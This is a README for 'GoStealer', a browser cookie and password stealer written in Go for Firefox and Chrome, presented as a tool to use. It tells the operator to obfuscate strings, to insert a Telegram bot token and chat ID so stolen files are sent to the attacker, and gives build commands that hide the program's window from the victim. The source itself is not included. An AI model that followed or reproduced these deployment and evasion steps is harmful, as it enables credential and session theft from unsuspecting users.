# GoStealer

#### **a cookies/passwords stealer written in GoLang support `FireFox` and `Chrome`**

### Libraries
> github.com/zalando/go-keyring
>
> github.com/Pallinder/go-randomdata
>
> github.com/mattn/go-sqlite3
>
> github.com/tidwall/gjson
>
> golang.org/x/crypto/pbkdf2

```
go get github.com/Pallinder/go-randomdata
go get github.com/mattn/go-sqlite3
go get github.com/tidwall/gjson
go get github.com/zalando/go-keyring
go get golang.org/x/crypto/pbkdf2
```
**- go-sqlite3 needs gcc on windows cause it depends on some c librares**

## setup

> to change the files destination use need to use [mumbojumbo](https://github.com/jeromer/mumbojumbo) tool to obfuscate the strings. 
>
> change the function called `ERxr8Z1` in `RiC4ef/RiC4ef.go` with the obfuscated "bot token of telegram you just made" by [mumbojumbo](https://github.com/jeromer/mumbojumbo).
>
> then replace `Wprep42` function in `RiC4ef/RiC4ef.go` with the obfuscated "chat ID which the stealer will send the files to" in format `sendDocument?chat_id={ID}` by [mumbojumbo](https://github.com/jeromer/mumbojumbo).

## build

### Windows
```
GOOS=windows ARCH=amd64 go build -ldflags "-s -w" -o stealer.exe .
#to hide the window
GOOS=windows ARCH=amd64 go build -ldflags "-s -w -H=windowsgui" -o stealer.exe .
```
### Linux
```
GOOS=linux ARCH=386 go build -ldflags "-s -w -H=windowsgui" -o stealer .
```
### MacOS
```
GOOS=darwin ARCH=amd64 go build -ldflags "-s -w -H=windowsgui" -o stealer .
```

## Contact

> Instagram: [@0xhades](https://instagram.com/0xhades)

**- If you really want the unobfuscated strings of the source code just tell me to add it, cause i'm lazy to do it right now**


